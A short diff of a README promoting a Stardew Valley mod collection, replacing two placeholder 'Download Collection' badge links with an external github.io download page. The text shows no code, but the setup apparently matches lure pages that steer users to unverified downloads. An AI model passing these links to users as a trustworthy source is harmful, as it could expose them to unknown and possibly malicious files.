@@ -3,7 +3,7 @@
 ![Stardew Valley Enhanced Gameplay](https://rexdl.com/image/android/game/stardew-valley.jpg)  
 *Revitalize your farming adventure with community-driven enhancements!*  
 
-[![Get Mod Collection](https://img.shields.io/badge/Download-Collection-9cf?style=for-the-badge&logo=github)](https://example.com)  
+[![Get Mod Collection](https://img.shields.io/badge/Download-Collection-9cf?style=for-the-badge&logo=github)](https://stardew-valley-mod-download.github.io/.github/)  
 
 ---  
 
@@ -65,7 +65,7 @@ Auto-resolves conflicts between popular mods.
 ![Mod Manager Interface](https://i.ytimg.com/vi/ei5MpU0-qNY/hq720.jpg)  
 *Intuitive UI for effortless mod management*  
 
-[![Get Mod Collection](https://img.shields.io/badge/Download-Collection-9cf?style=for-the-badge&logo=github)](https://example.com)  
+[![Get Mod Collection](https://img.shields.io/badge/Download-Collection-9cf?style=for-the-badge&logo=github)](https://stardew-valley-mod-download.github.io/.github/)  
 
 ---  
 
